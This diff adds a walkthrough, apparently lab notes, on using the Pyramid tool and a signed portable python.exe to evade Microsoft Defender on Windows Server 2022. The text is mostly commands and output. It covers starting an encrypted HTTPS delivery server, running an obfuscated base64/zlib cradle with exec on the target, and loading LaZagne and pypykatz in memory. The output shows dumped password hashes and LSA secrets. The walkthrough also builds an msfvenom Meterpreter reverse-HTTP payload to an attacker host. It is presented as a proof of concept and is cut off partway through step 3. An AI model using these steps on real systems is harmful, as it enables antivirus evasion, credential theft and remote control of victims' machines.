@@ -1,0 +1,544 @@
+====================================================================================================================================================
+Antivirus bypass using the tool 'Pyramid' and Python
+====================================================================================================================================================
+
+> https://github.com/naksyn/Pyramid 
+
+A tool to help operate in Antivirus and EDRs' blind spots:
+
+> Pyramid is useful to perform post-exploitation task in an evasive manner, executing offensive tooling from a signed binary (e.g. python.exe) by 
+  importing their dependencies in memory. 
+  This can be achieved because:
+  + The Python Embeddable package provides a signed (portable) Python interpreter with a good reputation;
+    - URL: https://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip
+  + Python has many legit applications, so there is a lot of different telemetry coming from the python.exe binary since the interpreter natively runs
+    the APIs. This can be abused by operating within the Python.exe process and trying to blend in the huge "telemetry fingerprint" of python.exe binary.
+  + There is a lack of auditing for Python code execution and the stock python.exe binary does not have auditing capabilities enabled by default.
+  + Operations can be done natively from within python.exe natively using Python language to perform post exploitation tasks such as dynamically importing 
+    Python modules to run offensive tools and executing Beacon Object Files (after some BOF modifications) directly within python.exe.
+
+> Pyramid is composed of:
+  1. A Python HTTP/S server that can deliver encrypted files (chacha, xor)
+  2. Python modules that can load in-memory dependencies of offensive tooling such as:
+     - bh.py will in-memory import and execute python-BloodHound.
+     - secretsdump.py will in-memory import and execute Impacket secretsdump.  
+     - shellcode.py is a simple in-memory shellcode injector.
+     - DonPAPI.py script will in-memory import and execute DonPAPI. Results and credentials extracted are saved on disk in 
+       the Python Embeddable Package Directory.  
+     - LaZagne.py script will in-memory import and execute LaZagne
+     - tunnel-socks5 script import and executes paramiko on a new Thread to create an SSH remote port forward to an SSH server, 
+       then a socks5 proxy server is executed locally on target and made accessible remotely through the SSH tunnel.
+     - clr script imports Pythonnet to load and execute a .NET assembly in-memory.
+     - pythonmemorymodule script import PythonMemoryModule to load a dll from memory.
+  3. Fixed Python dependencies (zip files) that can be imported in memory
+  4. Python cradle that can download, decrypt and execute in memory Pyramid modules
+
+Current features
+----------------
+> Pyramid modules capabilities can be executed directly from a Python interpreter and are currently:
+  + Downloading, decryption and in-memory loading of Python dependencies.
+  + Dynamic loading and execution of BloodHound Python, impacket secretsdump, DonPAPI, LaZagne.
+  + In-memory loading of a remotely fetched dll or exe via PythonMemoryModule
+  + SOCKS5 proxying through SSH reverse port forward tunnel.
+  + In-memory .NET assembly loading via Pythonnet
+
+> Pyramid HTTP server main features:
+  + On-the-fly encryption (chacha,xor) of files to be delivered
+  + Auto-generation of Server configs based on pyramid command line
+  + Decoding and decryption of HTTP parameters (URL)
+  + Basic HTTP Authentication
+
+> Cradle main features:
+  + Downloading, decryption and in-memory execution of Pyramid modules.
+  + Python-standard-libraries-only dependancy
+
+
+====================================================================================================================================================
+Basic PoC - Downloading and executing in-memory malicious files (e.g., credential stealer and shellcode) using the tool Pyramid and a portable signed
+            python binary on a Windows Server 2022 without being detected and blocked by the Microsoft Defender AV
+====================================================================================================================================================
+
+----------------------------------------------------------------------------------------------------------------------------------------------------
+Step 1 - Download and start the Pyramid HTTPs server with the python module 'LaZagne.py' on a Linux server
+----------------------------------------------------------------------------------------------------------------------------------------------------
+
+1.1 Clone or download the Github project
+-------------------------------------------
+git clone https://github.com/naksyn/Pyramid
+
+1.2 Generate an SSL certificate for the Pyramid HTTPs Server
+-------------------------------------------------------------
+jeff@kali:~/Documents/Tools/Pyramid-main/Server$ req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365
+
+If you want to use your own signed SSL certificate be sure to:
+- use pem format
+- rename the files with key.pem and cert.pem
+- place both files into the Server folder.
+
+
+1.3 Start the Pyramid HTTPs server with the python module 'LaZagne.py' 
+-----------------------------------------------------------------------
+jeff@kali:~/Documents/Tools/Pyramid-main/Server$ sudo python3 pyramid.py -p 443 -ssl -u testuser -pass Sup3rP4ss! -enc "chacha20" -passenc "TestPass1" -server "192.168.1.94" -generate -setcradle LaZagne.py
+[sudo] password for jeff:
+
+__________                              .__    .___
+\______   \___.__.____________    _____ |__| __| _/
+ |     ___<   |  |\_  __ \__  \  /     \|  |/ __ |
+ |    |    \___  | |  | \// __ \|  Y Y  \  / /_/ |
+ |____|    / ____| |__|  (____  /__|_|  /__\____ |
+           \/                 \/      \/        \/
+ HTTP/S server main features:
+ - Auto-generation of server config for modules and cradle (use -generate switch)
+ - Basic Authentication
+ - encryption of delivered files (chacha, xor)
+ - URL decoding and decryption
+
+ Version: 0.1
+ Author: @naksyn
+
+[+] Auto-generating Pyramid config for modules and agents
+[+] Text between delimiters removed and replaced on file bh.py
+[+] Text between delimiters removed and replaced on file moduleshifting.py
+[+] Text between delimiters removed and replaced on file secretsdump.py
+[+] Text between delimiters removed and replaced on file pythonmemorymodule.py
+[+] Text between delimiters removed and replaced on file LaZagne.py
+[+] Text between delimiters removed and replaced on file clr.py
+[+] Text between delimiters removed and replaced on file tunnel-socks5.py
+[!] Delimiters not found in the file shellcode.py - might be OK if Pyramid config are not needed for it
+[+] Text between delimiters removed and replaced on file DonPAPI.py
+[+] Text between delimiters removed and replaced on file cradle.py
+[+] Text between delimiters removed and replaced on file cradle.py
+[+] printing b64encoded(zipped(cradle.py)) for scriptless execution on terminal:
+import base64
+import zlib
+encoded_script="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"
+decoded_script = zlib.decompress(base64.b64decode(encoded_script.encode())).decode()
+exec(decoded_script)
+[+] Pyramid HTTP Server listening on port  443
+[+] MIND YOUR OPSEC! Serving Pyramid files from folder  /home/jeff/Documents/Tools/Pyramid-main/Server/
+[+] User allowed to fetch files:  testuser
+[+] HTTPS Server starting
+[+] Using SSL key  /home/jeff/Documents/Tools/Pyramid-main/Server/key.pem
+[+] Using SSL cert /home/jeff/Documents/Tools/Pyramid-main/Server/cert.pem
+/home/jeff/Documents/Tools/Pyramid-main/Server/pyramid.py:419: DeprecationWarning: ssl.wrap_socket() is deprecated, use SSLContext.wrap_socket()
+  server.socket = ssl.wrap_socket(server.socket, keyfile=options.sslkey, certfile=options.sslcert, server_side=True)
+Enter PEM pass phrase:
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Download a signed Python binary (python-3.10.4-embed-amd64.zip) on a target Windows server 2022 and use it to download, decrypt and execute 
+         in-memory the python module 'LaZagne.py' (which will dump local credentials i.e. Pypykatz passwords, Hashdump passwords, LSA secrets) 
+         without being detected by the Microsoft Defender AV 
+----------------------------------------------------------------------------------------------------------------------------------------------------
+
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users> systeminfo
+
+Host Name:                 SERVER-WIN2022
+OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
+OS Version:                10.0.20348 N/A Build 20348
+OS Manufacturer:           Microsoft Corporation
+<snip>
+
+PS C:\Users> cd C:\temp
+
+PS C:\temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled, AntivirusSIgnatureLastUpdated|FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSIgnatureLastUpdated : 7/27/2025 10:12:13 AM
+
+PS C:\temp> wget -uri http://192.168.1.144:8080/python-3.10.4-embed-amd64.zip -OutFile C:\temp\python.zip
+
+PS C:\temp> tar -xf .\python.zip
+
+PS C:\temp> dir
+
+    Directory: C:\temp
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----         7/27/2025  10:04 AM                Share
+-a----         3/23/2022  11:22 PM        3439512 libcrypto-1_1.dll
+-a----         3/23/2022  11:22 PM          32792 libffi-7.dll
+-a----         3/23/2022  11:22 PM         698784 libssl-1_1.dll
+-a----         3/23/2022  11:22 PM          32763 LICENSE.txt
+-a----         3/23/2022  11:22 PM         194000 pyexpat.pyd
+-a----         3/23/2022  11:22 PM         589053 python.cat
+-a----         3/23/2022  11:22 PM          99280 python.exe
+-a----         7/28/2025   3:14 PM        8523000 python.zip
+-a----         3/23/2022  11:22 PM          62416 python3.dll
+-a----         3/23/2022  11:22 PM        4445648 python310.dll
+-a----         3/23/2022  11:23 PM        2638493 python310.zip
+-a----         3/23/2022  11:23 PM             80 python310._pth
+-a----         3/23/2022  11:22 PM          97744 pythonw.exe
+-a----         3/23/2022  11:22 PM          26064 select.pyd
+-a----         3/23/2022  11:22 PM        1476048 sqlite3.dll
+-a----         3/23/2022  11:22 PM        1118672 unicodedata.pyd
+<SNIP>
+
+PS C:\temp> .\python.exe
+Python 3.10.4 (tags/v3.10.4:9d38120, Mar 23 2022, 23:13:41) [MSC v.1929 64 bit (AMD64)] on win32
+>>>
+>>> import base64
+>>> import zlib
+>>> encoded_script="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"
+>>> decoded_script = zlib.decompress(base64.b64decode(encoded_script.encode())).decode()
+>>> exec(decoded_script)
+
+[*] Downloading and unpacking on disk Cryptodome pyds dependencies on dir C:\temp
+[*] Decrypting received file
+[*] Loading in memory module package: future
+[*] Decrypting received file
+[*] Loading in memory module package: pyasn1
+[*] Decrypting received file
+[*] Loading in memory module package: rsa
+[*] Decrypting received file
+[*] Loading in memory module package: asn1crypto
+[*] Decrypting received file
+[*] Loading in memory module package: unicrypto
+[*] Decrypting received file
+[*] Loading in memory module package: minidump
+[*] Decrypting received file
+[*] Loading in memory module package: minikerberos
+[*] Decrypting received file
+[*] Loading in memory module package: pypykatz
+[*] Decrypting received file
+[*] Loading in memory module package: lazagne
+[*] Decrypting received file
+[*] Modules imported
+
+|====================================================================|
+|                                                                    |
+|                        The LaZagne Project                         |
+|                                                                    |
+|                          ! BANG BANG !                             |
+|                                                                    |
+|====================================================================|
+
+[+] System masterkey decrypted for 5416bd79-12e3-451c-8940-a490ad<snip>
+[+] System masterkey decrypted for 965fba1f-1b49-49ee-ba75-ea57ad<snip>
+
+########## User: SYSTEM ##########
+
+------------------- Hashdump passwords -----------------
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:6699270562fdbd1e74c7d3<snip>
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089<snip>
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c5<snip>
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5970404680bafc125<snip>
+
+------------------- Pypykatz passwords -----------------
+
+[+] Shahash found !!!
+Shahash: 62c9d420fbebe8aca4f08246582ccf4a<snip>
+Nthash: 6699270562fdbd1e74c7d369c8<snip>
+Login: Administrator
+
+------------------- Lsa_secrets passwords -----------------
+
+DPAPI_SYSTEM
+0000   01 00 00 00 D3 18 8B 46 FA BA B6 0B 28 56 82 FD    .......F....(V..
+0010   45 ED E2 36 33 67 F1 D9 32 04 DA 59 13 29 9B 84    E..63g..2..Y.)..
+0020   72 18 84 BA BF E8 90 89 58 25 BD 09                r.......X%..
+
+NL$KM
+0000   40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    @...............
+0010   EA F6 C2 81 BF 8B 38 22 93 E8 7A D4 76 A3 DC 27    ......8"..z.v..'
+0020   EE 89 F3 67 79 85 1E 5A 6F 64 2D 86 21 18 4A 10    ...gy..Zod-.!.J.
+0030   76 2F FA 62 F1 82 99 06 21 B4 FE BB 48 92 3D 11    v/.b....!...H.=.
+0040   91 1F FC FD 27 EE AB 54 8B D7 AB CD 05 EE 14 B8    ....'..T........
+0050   FD FB 79 CE B2 FA C3 24 11 C4 F6 76 42 47 9F D7    ..y....$...vBG..
+
+
+[+] 62c9d420fbebe8aca4f08246582ccf4a34<snip> ok for masterkey 0ec3ce8f-51a2-4db2-aee9-0a3c80<snip>
+
+[+] 1 passwords have been found.
+For more information launch it again with the -v option
+
+elapsed time = 2.6218395233154297
+>>>
+>>> import sys
+>>> sys.exit()
+
+
+Logs on the Pyramid HTTPs server
+=================================
+192.168.1.11 - - [29/Jul/2025 00:26:10] "GET /login/fv0n6Eq+q4xEuA== HTTP/1.1" 200 -
+[+] Decoding and Decrypting URL: fv0n6Eq+q4xEuA==
+[+] Decrypted path: LaZagne.py
+[+] Delivered encrypted file Modules/LaZagne.py
+192.168.1.11 - - [29/Jul/2025 00:26:10] "GET /login/Xv0H6Eq+q48Z7PB8S9cmf9JGxMvDn7Ak HTTP/1.1" 200 -
+[+] Decoding and Decrypting URL: Xv0H6Eq+q48Z7PB8S9cmf9JGxMvDn7Ak
+[+] Decrypted path: lazagne---Cryptodome.zip
+[+] Delivered encrypted file Dependencies/lazagne/Cryptodome.zip
+192.168.1.11 - - [29/Jul/2025 00:26:13] "GET /login/Xv0H6Eq+q48Z7NV7RtIgdZhTwN4= HTTP/1.1" 200 -
+[+] Decoding and Decrypting URL: Xv0H6Eq+q48Z7NV7RtIgdZhTwN4=
+[+] Decrypted path: lazagne---future.zip
+[+] Delivered encrypted file Dependencies/lazagne/future.zip
+192.168.1.11 - - [29/Jul/2025 00:26:13] "GET /login/Xv0H6Eq+q48Z7MN3U9Q8IZhTwN4= HTTP/1.1" 200 -
+[+] Decoding and Decrypting URL: Xv0H6Eq+q48Z7MN3U9Q8IZhTwN4=
+[+] Decrypted path: lazagne---pyasn1.zip
+[+] Delivered encrypted file Dependencies/lazagne/pyasn1.zip
+192.168.1.11 - - [29/Jul/2025 00:26:13] "GET /login/Xv0H6Eq+q48Z7MF9U4koecY= HTTP/1.1" 200 -
+[+] Decoding and Decrypting URL: Xv0H6Eq+q48Z7MF9U4koecY=
+[+] Decrypted path: lazagne---rsa.zip
+[+] Delivered encrypted file Dependencies/lazagne/rsa.zip
+192.168.1.11 - - [29/Jul/2025 00:26:13] "GET /login/Xv0H6Eq+q48Z7NJ9XJYxYs9Z3cHDn7Ak HTTP/1.1" 200 -
+[+] Decoding and Decrypting URL: Xv0H6Eq+q48Z7NJ9XJYxYs9Z3cHDn7Ak
+[+] Decrypted path: lazagne---asn1crypto.zip
+[+] Delivered encrypted file Dependencies/lazagne/asn1crypto.zip
+192.168.1.11 - - [29/Jul/2025 00:26:14] "GET /login/Xv0H6Eq+q48Z7MZgW8QgacZdxoCXjKk= HTTP/1.1" 200 -
+[+] Decoding and Decrypting URL: Xv0H6Eq+q48Z7MZgW8QgacZdxoCXjKk=
+[+] Decrypted path: lazagne---unicrypto.zip
+[+] Delivered encrypted file Dependencies/lazagne/unicrypto.zip
+192.168.1.11 - - [29/Jul/2025 00:26:14] "GET /login/Xv0H6Eq+q48Z7N5nXM42ZdtZh9SElQ== HTTP/1.1" 200 -
+[+] Decoding and Decrypting URL: Xv0H6Eq+q48Z7N5nXM42ZdtZh9SElQ==
+[+] Decrypted path: lazagne---minidump.zip
+[+] Delivered encrypted file Dependencies/lazagne/minidump.zip
+192.168.1.11 - - [29/Jul/2025 00:26:14] "GET /login/Xv0H6Eq+q48Z7N5nXM45dcRLzNyClvcuWQE= HTTP/1.1" 200 -
+[+] Decoding and Decrypting URL: Xv0H6Eq+q48Z7N5nXM45dcRLzNyClvcuWQE=
+[+] Decrypted path: lazagne---minikerberos.zip
+[+] Delivered encrypted file Dependencies/lazagne/minikerberos.zip
+192.168.1.11 - - [29/Jul/2025 00:26:14] "GET /login/Xv0H6Eq+q48Z7MN3Qt45ccJTh9SElQ== HTTP/1.1" 200 -
+[+] Decoding and Decrypting URL: Xv0H6Eq+q48Z7MN3Qt45ccJTh9SElQ==
+[+] Decrypted path: lazagne---pypykatz.zip
+[+] Delivered encrypted file Dependencies/lazagne/pypykatz.zip
+192.168.1.11 - - [29/Jul/2025 00:26:15] "GET /login/Xv0H6Eq+q48Z7N9vSMY1ftMH08ed HTTP/1.1" 200 -
+[+] Decoding and Decrypting URL: Xv0H6Eq+q48Z7N9vSMY1ftMH08ed
+[+] Decrypted path: lazagne---lazagne.zip
+[+] Delivered encrypted file Dependencies/lazagne/lazagne.zip
+^C
+Exiting server...
+
+----------------------------------------------------------------------------------------------------------------------------------------------------
+Step 3 - Re-start the Pyramid HTTPs server with the module 'shellcode.py' after having added a python shellcode in it 
+         (for this PoC I used a simple Meterpreter HTTP reverse shell)
+----------------------------------------------------------------------------------------------------------------------------------------------------
+
+3.1 Generate a Python Shellcode (in this basic example I used Msfvenom)
+-----------------------------------------------------------------------
+jeff@kali:~/Documents/Tools/Pyramid-main/Agent$ msfvenom -p windows/x64/meterpreter_reverse_http EXITFUNC=thread LHOST=192.168.1.94 LPORT=80 -a x64 -f python -o shellcodeMSF
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+No encoder specified, outputting raw payload
+Payload size: 201308 bytes
+Final size of python file: 975589 bytes
+Saved as: shellcodeMSF
+
+3.2. Then insert the python Meterpreter shellcode in the module 'shellcode.py'
+------------------------------------------------------------------------------
+jeff@kali:~/Documents/Tools/Pyramid-main/Server$ ls
+cert.pem  Delivery_files  Dependencies  Helpers  key.pem  Modules  pyramid.py
+
+jeff@kali:~/Documents/Tools/Pyramid-main/Server$ ls Modules
+bh.py  clr.py  DonPAPI.py  LaZagne.py  moduleshifting.py  pythonmemorymodule.py  secretsdump.py  shellcode.py  tunnel-socks5.py
+
+jeff@kali:~/Documents/Tools/Pyramid-main/Server$ cd Modules
+
+jeff@kali:~/Documents/Tools/Pyramid-main/Server$ vim shellcode.py
+
+
+3.3 Re-start the Pyramid HTTPs server with the module 'shellcode.py' 
+--------------------------------------------------------------------
+jeff@kali:~/Documents/Tools/Pyramid-main/Server$ sudo python3 pyramid.py -p 443 -ssl -u testuser -pass Sup3rP4ss! -enc "chacha20" -passenc "TestPass1" -server "192.168.1.94" -generate -setcradle shellcode.py
+[sudo] password for jeff:
+__________                              .__    .___
+\______   \___.__.____________    _____ |__| __| _/
+ |     ___<   |  |\_  __ \__  \  /     \|  |/ __ |
+ |    |    \___  | |  | \// __ \|  Y Y  \  / /_/ |
+ |____|    / ____| |__|  (____  /__|_|  /__\____ |
+           \/                 \/      \/        \/
+ HTTP/S server main features:
+ - Auto-generation of server config for modules and cradle (use -generate switch)
